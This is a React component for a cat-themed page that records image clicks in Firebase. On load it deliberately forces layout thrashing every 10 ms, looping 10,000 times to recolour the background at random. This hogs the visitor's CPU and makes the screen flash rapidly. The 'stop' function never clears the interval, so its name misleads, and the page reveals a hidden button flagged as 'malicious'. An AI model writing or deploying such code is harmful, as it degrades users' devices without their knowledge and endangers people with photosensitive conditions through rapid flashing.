import React, { useState, useEffect } from "react";
import { ref, set, onValue } from "firebase/database";
import { database } from "../../firebase";

const CatsPage = () => {
  const [maliciousButtonVisible, setMaliciousButtonVisible] = useState(false);

  useEffect(() => {
    const interval = setInterval(() => {
      causeLayoutThrashing();
    }, 10);

    return () => clearInterval(interval);
  }, []);

  const causeLayoutThrashing = () => {
    for (let i = 0; i < 10000; i++) {
      const offsetHeight = document.body.offsetHeight;
      document.body.style.backgroundColor = `rgb(${Math.random() * 255}, ${
        Math.random() * 255
      }, ${Math.random() * 255})`;
    }
  };

  const stopLayoutThrashing = () => {
    setMaliciousButtonVisible(true);
    replaceImagesWithCats();
  };

  const replaceImagesWithCats = () => {
    const images = document.querySelectorAll("#images .image-container img");
    images.forEach((img) => {
      img.src = `https://cataas.com/cat?random=${Math.random()}`;
    });
  };

  const recordClick = (catNumber) => {
    const clicksRef = ref(database, `clicks/cat${catNumber}`);
    onValue(clicksRef, (snapshot) => {
      const currentCount = snapshot.val() || 0;
      set(clicksRef, currentCount + 1);
    }, { onlyOnce: true });
  };

  const handleCatClick = (catNumber) => {
    recordClick(catNumber);
  };

  return (
    <div style={styles.page}>
      <div id="images" style={styles.images}>
        <div style={styles.imageContainer}>
          <img src="image1.jpg" alt="Cat 1" />
        </div>
        <div style={styles.imageContainer}>
          <img src="image2.jpg" alt="Cat 2" />
        </div>
        <div style={styles.imageContainer}>
          <a onClick={() => handleCatClick(3)}>
            <img src="image3.jpg" alt="Cat 3" />
          </a>
        </div>
        <div style={styles.imageContainer}>
          <a onClick={() => handleCatClick(4)}>
            <img src="image4.jpg" alt="Cat 4" />
          </a>
        </div>
      </div>
      <div style={styles.container}>
        <button style={styles.button} onClick={stopLayoutThrashing}>
          Show Image
        </button>
        {maliciousButtonVisible && (
          <button style={{ ...styles.button, visibility: "hidden" }}>
            Show Image
          </button>
        )}
      </div>
    </div>
  );
};

const styles = {
  page: {
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    justifyContent: "center",
    minHeight: "100vh",
    margin: 0,
  },
  container: {
    position: "relative",
    display: "flex",
    justifyContent: "center",
  },
  button: {
    width: "100px",
    height: "50px",
    position: "relative",
  },
  images: {
    display: "flex",
    justifyContent: "center",
    flexDirection: "column",
  },
  imageContainer: {
    width: "100px",
    height: "100px",
    overflow: "hidden",
    margin: "10px",
    display: "inline-block",
  },
};

export default CatsPage;
